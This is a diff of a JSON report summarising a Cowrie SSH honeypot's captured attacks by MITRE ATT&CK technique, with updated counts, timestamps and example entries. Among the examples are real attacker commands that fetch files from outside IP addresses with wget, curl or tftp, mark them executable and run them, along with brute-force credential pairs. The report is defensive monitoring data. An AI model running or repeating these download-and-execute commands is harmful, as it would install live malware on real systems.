@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-07 15:01:45",
+  "generated": "2026-09-07 16:00:45",
   "totals": {
-    "commands": 339,
-    "login_failed": 3577,
-    "login_success": 89,
-    "sessions": 3273
+    "commands": 373,
+    "login_failed": 3610,
+    "login_success": 93,
+    "sessions": 3326
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 3577,
+      "count": 3610,
       "examples": [
         "root / 123456789",
         "root / admin1",
@@ -21,30 +21,14 @@
         "root / 1q2w3e4r"
       ],
       "first": "2026-09-07T00:01:55.927554Z",
-      "last": "2026-09-07T14:58:03.917070Z",
-      "unique_ips": 142
-    },
-    {
-      "id": "T1078",
-      "name": "Valid Accounts",
-      "tactic": "Initial Access",
-      "count": 89,
-      "examples": [
-        "nobody / qwerty",
-        "root / 1234",
-        "admin / admin123#",
-        "root / momo123",
-        "root / senha1"
-      ],
-      "first": "2026-09-07T00:13:31.233466Z",
-      "last": "2026-09-07T14:53:58.095572Z",
-      "unique_ips": 73
+      "last": "2026-09-07T15:57:30.877794Z",
+      "unique_ips": 146
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 86,
+      "count": 101,
       "examples": [
         "/bin/busybox cp /bin/echo con ; >con; /bin/busybox chmod 777 con; /bin/busybox aylVUljl",
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
@@ -53,14 +37,30 @@
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/"
       ],
       "first": "2026-09-07T02:03:30.215772Z",
-      "last": "2026-09-07T14:21:50.847977Z",
-      "unique_ips": 14
+      "last": "2026-09-07T15:15:47.722279Z",
+      "unique_ips": 15
+    },
+    {
+      "id": "T1078",
+      "name": "Valid Accounts",
+      "tactic": "Initial Access",
+      "count": 93,
+      "examples": [
+        "nobody / qwerty",
+        "root / 1234",
+        "admin / admin123#",
+        "root / momo123",
+        "root / senha1"
+      ],
+      "first": "2026-09-07T00:13:31.233466Z",
+      "last": "2026-09-07T15:59:21.585941Z",
+      "unique_ips": 76
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 69,
+      "count": 73,
       "examples": [
         "/bin/busybox tftp -g -l /tmp/.none -r yCz31g9 36.39.206.36 ; cat /tmp/.none ; rm /tmp/.none ; /bin/busybox aylVUljl",
         "/bin/busybox wget http://36.39.206.36:43516/lvn3/eU -O /tmp/.none ; cat /tmp/.none ; rm /tmp/.none ; /bin/busybox aylVUl",
@@ -69,8 +69,8 @@
         "/bin/busybox wget http://36.39.206.36:43516/lvn3/eU -O /dev/.none ; cat /dev/.none ; rm /dev/.none ; /bin/busybox aylVUl"
       ],
       "first": "2026-09-07T02:03:31.165623Z",
-      "last": "2026-09-07T14:21:50.847977Z",
-      "unique_ips": 12
+      "last": "2026-09-07T15:15:47.722279Z",
+      "unique_ips": 13
     },
     {
       "id": "T1082",
@@ -92,14 +92,14 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 7,
+      "count": 8,
       "examples": [
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-09-07T03:08:41.138573Z",
-      "last": "2026-09-07T12:06:51.497336Z",
-      "unique_ips": 7
+      "last": "2026-09-07T15:15:11.402453Z",
+      "unique_ips": 8
     },
     {
       "id": "T1059.004",
@@ -183,27 +183,35 @@
   "unmapped": [
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      33
+      41
     ],
     [
       "shell",
-      18
+      19
     ],
     [
       "sh",
-      17
+      19
     ],
     [
       "system",
-      15
+      16
     ],
     [
       "enable",
-      13
+      14
     ],
     [
       "/bin/busybox aylVUljl",
       12
+    ],
+    [
+      "cd /proc && cat self/cmdline",
+      9
+    ],
+    [
+      "linuxshell",
+      8
     ],
     [
       "zalee",
@@ -218,24 +226,16 @@
       8
     ],
     [
-      "cd /proc && cat self/cmdline",
-      7
-    ],
-    [
-      "linuxshell",
-      7
-    ],
-    [
       "ping ;sh",
-      6
+      7
     ],
     [
       "/bin/busybox",
-      5
+      6
     ],
     [
       "enablelinuxshell",
-      5
+      6
     ],
     [
       "su",
